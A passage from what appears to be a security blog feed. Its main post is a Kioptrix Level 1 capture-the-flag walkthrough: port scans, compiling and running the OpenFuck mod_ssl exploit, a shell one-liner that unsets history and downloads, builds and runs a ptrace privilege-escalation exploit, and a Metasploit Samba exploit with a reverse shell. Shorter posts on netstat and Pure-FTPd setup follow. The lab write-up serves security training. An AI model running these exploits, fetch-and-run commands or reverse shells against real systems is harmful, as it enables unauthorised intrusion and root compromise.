<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nmap -A -p1-65535 192.168.127.153
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-12 22:56 EEST
</span><span class='line'>Nmap scan report for 192.168.127.153
</span><span class='line'>Host is up (0.00035s latency).
</span><span class='line'>Not shown: 65529 closed ports
</span><span class='line'>PORT     STATE SERVICE     VERSION
</span><span class='line'>22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
</span><span class='line'>|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
</span><span class='line'>|_sshv1: Server supports SSHv1
</span><span class='line'>80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
</span><span class='line'>| http-methods: Potentially risky methods: TRACE
</span><span class='line'>|_See http://nmap.org/nsedoc/scripts/http-methods.html
</span><span class='line'>|_http-title: Test Page for the Apache Web Server on Red Hat Linux
</span><span class='line'>111/tcp  open  rpcbind     2 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100024  1           1024/tcp  status
</span><span class='line'>|_  100024  1           1024/udp  status
</span><span class='line'>139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
</span><span class='line'>443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
</span><span class='line'>| http-methods: Potentially risky methods: TRACE
</span><span class='line'>|_See http://nmap.org/nsedoc/scripts/http-methods.html
</span><span class='line'>|_http-title: Test Page for the Apache Web Server on Red Hat Linux
</span><span class='line'>| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
</span><span class='line'>| Not valid before: 2009-09-26T08:32:06+00:00
</span><span class='line'>|_Not valid after:  2010-09-26T08:32:06+00:00
</span><span class='line'>|_ssl-date: 2014-06-12T19:58:14+00:00; +1m51s from local time.
</span><span class='line'>| sslv2: 
</span><span class='line'>|   SSLv2 supported
</span><span class='line'>|   ciphers: 
</span><span class='line'>|     SSL2_DES_192_EDE3_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_CBC_128_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC4_128_WITH_MD5
</span><span class='line'>|     SSL2_RC4_64_WITH_MD5
</span><span class='line'>|     SSL2_DES_64_CBC_WITH_MD5
</span><span class='line'>|     SSL2_RC2_CBC_128_CBC_WITH_MD5
</span><span class='line'>|_    SSL2_RC4_128_EXPORT40_WITH_MD5
</span><span class='line'>1024/tcp open  status      1 (RPC #100024)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2            111/tcp  rpcbind
</span><span class='line'>|   100000  2            111/udp  rpcbind
</span><span class='line'>|   100024  1           1024/tcp  status
</span><span class='line'>|_  100024  1           1024/udp  status
</span><span class='line'>MAC Address: 00:0C:29:1A:EE:9E (VMware)
</span><span class='line'>Device type: general purpose
</span><span class='line'>Running: Linux 2.4.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.4
</span><span class='line'>OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
</span><span class='line'>Network Distance: 1 hop
</span><span class='line'>
</span><span class='line'>Host script results:
</span><span class='line'>|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span><span class='line'>
</span><span class='line'>TRACEROUTE
</span><span class='line'>HOP RTT     ADDRESS
</span><span class='line'>1   0.35 ms 192.168.127.153
</span><span class='line'>
</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 27.11 seconds</span></code></pre></td></tr></table></div></figure>


<h3>Port 22 ssh</h3>

<p>According to Nessus, the SSH version is vulnerable to CVE-2002-0083:</p>

<blockquote><p>Versions prior than 3.1 are vulnerable to an off by one error that allows local users to gain root access, and it may be
possible for remote users to similarly compromise the daemon for remote access.
In addition, a vulnerable SSH client may be compromised by connecting to a malicious SSH daemon that exploits this
vulnerability in the client code, thus compromising the client system.</p></blockquote>

<p>I searched, but I couldn&rsquo;t find a suitable exploit for this, so will leave it at this.</p>

<h3>Port 80 / 443 apache ssl</h3>

<p>Now let&rsquo;s try that outdated Apache server. Here are the results from a Nikto scan against it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nikto -host 192.168.127.153
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.127.153
</span><span class='line'>+ Target Hostname:    192.168.127.153
</span><span class='line'>+ Target Port:        80
</span><span class='line'>+ Start Time:         2014-06-13 00:13:08 (GMT3)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 06:12:46 2001
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
</span><span class='line'>+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
</span><span class='line'>+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
</span><span class='line'>+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.0.1e). OpenSSL 0.9.8r is also current.
</span><span class='line'>+ OSVDB-637: Enumeration of users is possible by requesting ~username (responds with 'Forbidden' for users, 'not found' for non-existent users).
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
</span><span class='line'>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
</span><span class='line'>+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
</span><span class='line'>+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
</span><span class='line'>+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
</span><span class='line'>+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.
</span><span class='line'>+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
</span><span class='line'>+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
</span><span class='line'>+ OSVDB-3268: /manual/: Directory indexing found.
</span><span class='line'>+ OSVDB-3092: /manual/: Web server manual found.
</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ OSVDB-3092: /test.php: This might be interesting...
</span><span class='line'>+ 7355 requests: 0 error(s) and 20 item(s) reported on remote host
</span><span class='line'>+ End Time:           2014-06-13 00:13:52 (GMT3) (44 seconds)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 1 host(s) tested</span></code></pre></td></tr></table></div></figure>


<p>The interesting line that will lead to the exploit is this one:</p>

<p><strong>+ mod_ssl/2.8.4 &ndash; mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. CVE-2002-0082, OSVDB-756.</strong></p>

<blockquote><p>mod_ssl &lt; 2.8.7 is vulnerable to a remotely exploitable buffer overflow when attempting to cache SSL sessions. This allows for remote
code  execution, and the modification of any file on the system.</p></blockquote>

<p>An exploit is available at <a href="http://www.exploit-db.com/exploits/764/">http://www.exploit-db.com/exploits/764/</a></p>

<p>Before jumping in, a little modification is necessary because the exploit is old. If we try to compile right away we will get a bunch of errors. So let&rsquo;s make the changes.</p>

<p>If you don&rsquo;t already have it, install the libssl-dev library:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> apt-get install libssl-dev</span></code></pre></td></tr></table></div></figure>


<p>Now add the following lines in the C source code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;openssl/rc4.h&gt;
</span><span class='line'>#include &lt;openssl/md5.h&gt;</span></code></pre></td></tr></table></div></figure>


<p>Next, search for wget in the source and replace the URL with the newer one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span></code></pre></td></tr></table></div></figure>


<p>In the <em>get_server_hello</em> function, change the declaration</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unsigned char *p, *end; </span></code></pre></td></tr></table></div></figure>


<p>to</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>const unsigned char *p, *end;</span></code></pre></td></tr></table></div></figure>


<p>Now we can compile the exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -o openfuck openfuck.c -lcrypto</span></code></pre></td></tr></table></div></figure>


<p>Now, if you run it, you will see a range of supported offsets. From our previous scan, we know those applicable to our target are the redhat 1.3.20 versions. We can manually search for them in the offsets or run the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./openfuck | grep -i redhat | grep "1.3.20"</span></code></pre></td></tr></table></div></figure>


<p>This will give us 2 offsets:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
</span><span class='line'>
</span><span class='line'>0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2</span></code></pre></td></tr></table></div></figure>


<p>So, let&rsquo;s try it out:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./openfuck 0x6a 192.168.127.153 443
</span><span class='line'>
</span><span class='line'>Establishing SSL connection
</span><span class='line'>
</span><span class='line'>cipher: 0x4043808c   ciphers: 0x80fe500
</span><span class='line'>
</span><span class='line'>Ready to send shellcode
</span><span class='line'>
</span><span class='line'>Spawning shell...
</span><span class='line'>
</span><span class='line'>Good Bye!</span></code></pre></td></tr></table></div></figure>


<p>Ok, that one didn&rsquo;t work. Let&rsquo;s try the other one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./openfuck 0x6b 192.168.127.153 443
</span><span class='line'>
</span><span class='line'>Establishing SSL connection
</span><span class='line'>
</span><span class='line'>cipher: 0x4043808c   ciphers: 0x80fc4e8
</span><span class='line'>
</span><span class='line'>Ready to send shellcode
</span><span class='line'>
</span><span class='line'>Spawning shell...
</span><span class='line'>
</span><span class='line'>bash: no job control in this shell
</span><span class='line'>
</span><span class='line'>bash-2.05$
</span><span class='line'>
</span><span class='line'>bash-2.05$ unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p;
</span><span class='line'>
</span><span class='line'>--14:29:59--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
</span><span class='line'>
</span><span class='line'>           =&gt; `ptrace-kmod.c'
</span><span class='line'>
</span><span class='line'>Connecting to dl.packetstormsecurity.net:80... connected!
</span><span class='line'>
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>
</span><span class='line'>Length: 3,921 [text/x-csrc]
</span><span class='line'>
</span><span class='line'>    0K ...                                                   100% @   3.74 MB/s
</span><span class='line'>
</span><span class='line'>14:30:00 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]
</span><span class='line'>
</span><span class='line'>[+] Attached to 1444
</span><span class='line'>
</span><span class='line'>[+] Waiting for signal
</span><span class='line'>
</span><span class='line'>[+] Signal caught
</span><span class='line'>
</span><span class='line'>[+] Shellcode placed at 0x4001189d
</span><span class='line'>
</span><span class='line'>[+] Now wait for suid shell...
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>And we got a shell!</p>

<h3>Port 139 samba</h3>

<p>The exploit for this is available in Metasploit:</p>

<p><strong>Samba trans2open Overflow (Linux x86)</strong></p>

<blockquote><p>This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86
Linux systems that do not have the noexec stack option set. NOTE: Some older versions of RedHat do not seem to be vulnerable since they
apparently do not allow anonymous access to IPC.</p></blockquote>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/linux/samba/trans2open
</span><span class='line'>msf exploit(trans2open) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/linux/samba/trans2open):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   RHOST                   yes       The target address
</span><span class='line'>   RPORT  139              yes       The target port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Samba 2.2.x - Bruteforce
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(trans2open) &gt; set RHOST 192.168.127.153
</span><span class='line'>RHOST =&gt; 192.168.127.153
</span><span class='line'>msf exploit(trans2open) &gt; set payload linux/x86/shell_reverse_tcp 
</span><span class='line'>payload =&gt; linux/x86/shell_reverse_tcp
</span><span class='line'>msf exploit(trans2open) &gt; set LHOST 192.168.127.159
</span><span class='line'>LHOST =&gt; 192.168.127.159
</span><span class='line'>msf exploit(trans2open) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse handler on 192.168.127.159:4444 
</span><span class='line'>[*] Trying return address 0xbffffdfc...
</span><span class='line'>[*] Trying return address 0xbffffcfc...
</span><span class='line'>[*] Trying return address 0xbffffbfc...
</span><span class='line'>[*] Trying return address 0xbffffafc...
</span><span class='line'>[*] Trying return address 0xbffff9fc...
</span><span class='line'>[*] Command shell session 1 opened (192.168.127.159:4444 -&gt; 192.168.127.153:1047) at 2014-06-13 00:31:15 +0300
</span><span class='line'>[*] Command shell session 2 opened (192.168.127.159:4444 -&gt; 192.168.127.153:1048) at 2014-06-13 00:31:15 +0300
</span><span class='line'>
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>There is a flag present on this machine, which is located here:</p>

<p><code>/var/spool/mail/root</code></p>

<blockquote><p>If you are reading this, you got root. Congratulations.
Level 2 won&rsquo;t be as easy&hellip;</p></blockquote>

<p>And this was the first level in the Kioptrix series. Here&rsquo;s a cookie till next time:</p>

<blockquote><p>You&rsquo;re a card which will have to be dealt with.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Network tools - netstat]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/11/network-tools-netstat/"/>
    <updated>2014-06-11T21:14:59+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/11/network-tools-netstat</id>
    <content type="html"><![CDATA[<p>Netstat is a very important tool for gathering information about the connections on a machine or troubleshooting network problems. It&rsquo;s a default utility for both Windows and Linux, thus there is no excuse in not getting familiar with it, it&rsquo;s very useful for any system admin, network guy or good old home user that would like to know what really is coming and going to and from his computer.</p>

<!-- more -->


<p>If ran with no arguments, netstat produses an overwhelming output of all the open sockets in the system. Here is its <em>man</em> page description:</p>

<blockquote><p>netstat  &ndash; Print network connections, routing tables, interface statistics,
masquerade connections, and multicast memberships</p></blockquote>

<p>Netstat is great when run with specific flags to zoom in on the information that is relevant to us. Here are some examples:</p>

<p><strong>Display the PID and the name of the program to which eack socket belongs, along with the path</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-p.png" title="netstat -p" alt="netstat --program"></p>

<p><strong>Display only listening sockets</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-l.png" title="netstat -l" alt="netstat --listening"></p>

<p><strong>Display all ports (both listening and non-listening</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-a.png" title="netstat -a" alt="netstat --all"></p>

<p><strong>Display listening sockets and established connections</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-ap.png" title="netstat -ap" alt="netstat -ap"></p>

<p><strong>Display TCP ports and connections</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-at.png" title="netstat -at" alt="netstat tcp"></p>

<p><strong>Display TCP statistics</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-st.png" title="netstat -st" alt="netstat stats"></p>

<p><strong>Display kernel routing tables</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-r.png" title="netstat -r" alt="netstat route"></p>

<p><strong>Display all TCP connections and listening ports using numeric values for addresses and ports, instead of resolving their names</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/netstat-antp.png" title="netstat -antp" alt="netstat antp"></p>

<blockquote><p>Q:    Why is Poland just like the United States?
A:    In the United States you can&rsquo;t buy anything for zlotys and in
  Poland you can&rsquo;t either, while in the U.S. you can get whatever
  you want for dollars, just as you can in Poland.
  &mdash; being told in Poland, 1987</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Getting Pure-FTPd up and running]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/09/getting-pure-ftpd-up-and-running/"/>
    <updated>2014-06-09T23:20:06+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/09/getting-pure-ftpd-up-and-running</id>
    <content type="html"><![CDATA[<p>In this tutorial I&rsquo;ll present the steps I took to set up Pure-FTPd on a Backtrack system. There might be slight differences for other distributions, particularly where file names and locations are concerned.</p>

<!-- more -->


<p>First, a brief description of Pure-FTPd, from the official documentation:</p>

<blockquote><p>Pure-FTPd is a fast, production-quality, standard-conformant FTP server, based upon
Troll-FTPd.</p>

<p>Features include chroot()ed and/or virtual chroot()ed home directories, virtual
domains, built-in &lsquo;ls&rsquo;, anti warez system, configurable ports for passive
downloads, FXP protocol, bandwidth throttling, ratios, LDAP / MySQL / PostgreSQL-
based authentication, fortune files, Apache-like log files, fast standalone mode,
text / HTML / XML real-time status report, virtual users, virtual quotas, privilege > separation, SSL/TLS and more.</p></blockquote>

<p>Something to keep in mind is that, unlike other FTP servers, Pure-FTPd is controlled through command line arguments, rather than a configuration file. The latter is possible, but I won&rsquo;t cover it here.</p>

<p>Before going into the commands, I want to explain the concept of <strong>virtual users</strong>. These are FTP-only accounts that don&rsquo;t have to exit on the system, since they&rsquo;re used only for FTP. They have to be associated with a system user, so a good practice which I&rsquo;ll follow here is to create a dedicated system account just for FTP. Thousands of virtual users can share the same system user, as long as they all are chrooted and they have their own home directory.</p>

<p>Now, on to getting the server ready to..serve. First, create a group for FTP activities:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>groupadd ftpgroup</span></code></pre></td></tr></table></div></figure>


<p>Now, create a system user that will be used for FTP only:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>useradd -g ftpgroup -d /dev/null -s /etc ftpuser</span></code></pre></td></tr></table></div></figure>


<p>The name of the user is ftpuser. The -g flag associates it with the previously created group. Since I don&rsquo;t want the user to have a home directory or a login shell for security reasons, the -d option nukes the home directory by assigning it to /dev/null, and -s option sets /etc as a  fake shell.</p>

<p>Next, make a directory for FTP users:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /home/ftpusers</span></code></pre></td></tr></table></div></figure>


<p>Now we want to create our first virtual user. First, make a home directory for that user (note that there is a switch to automate this, but I use the manual approach here):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir /home/ftpusers/testuser</span></code></pre></td></tr></table></div></figure>


<p>The <strong>pure-pw</strong> utility is what we&rsquo;ll use for managing virtual users. We could manually edit files instead, but who would want that when there&rsquo;s a nice, clean way?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pure-pw useradd testuser -u ftpuser -d /home/ftpusers/testuser</span></code></pre></td></tr></table></div></figure>


<p>This creates a virtual user named testuser, with the same UID as ftpuser, and that is chrooted to its home directory.</p>

<p>Next step is to commit all the virtual users changes to a PureDB file. Without committing changes to the database, the accounts won&rsquo;t be activated, and unusable.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pure-pw mkdb</span></code></pre></td></tr></table></div></figure>


<p>We then have to set up some symbolic links to add PureDB to the authentication methods:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ln -s /etc/pure-ftpd/pureftpd.passwd /etc/pureftpd.passwd
</span><span class='line'>ln -s /etc/pure-ftpd/pureftpd.pdb /etc/pureftpd.pdb
</span><span class='line'>ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/PureDB</span></code></pre></td></tr></table></div></figure>


<p>If you don&rsquo;t need Unix and PAM authentication, you can do the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo no &gt; /etc/pure-ftpd/conf/UnixAuthentication
</span><span class='line'>echo no &gt; /etc/pure-ftpd/conf/PAMAuthentication</span></code></pre></td></tr></table></div></figure>


<p>Lastly, change the permissions of /home/ftpusers and its subdirectories to have ftpuser as owner and ftpgroup as group:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chown -R ftpuser /home/ftpusers
</span><span class='line'>chgrp -R ftpgroup /home/ftpusers</span></code></pre></td></tr></table></div></figure>


<p>From here on there are a lot of options which you can use to customize your FTP server to suit your needs. As always, a good place to start looking for more advanced options is in the man pages and official documentation.</p>

<p>Cookie:</p>

<blockquote><p>You don&rsquo;t become a failure until you&rsquo;re satisfied with being one.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Metasploitable 2]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/03/pentest-lab-metasploitable-2/"/>
    <updated>2014-06-03T21:16:09+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/03/pentest-lab-metasploitable-2</id>
    <content type="html"><![CDATA[<p>Today I will walk through different ways of exploiting Metasploitable 2, the newer release of Rapid7&rsquo;s popular vulnerable machine. First, what is Metasploitable?</p>

<!-- more -->


<blockquote><p>Metasploitable is an intentionally vulnerable Linux virtual machine. This VM can be
used to conduct security training, test security tools, and practice common
penetration testing techniques.</p></blockquote>

<p>In my lab environment, the IP of the attacker machine is 192.168.127.159, and the victim machine is 192.168.127.154.</p>

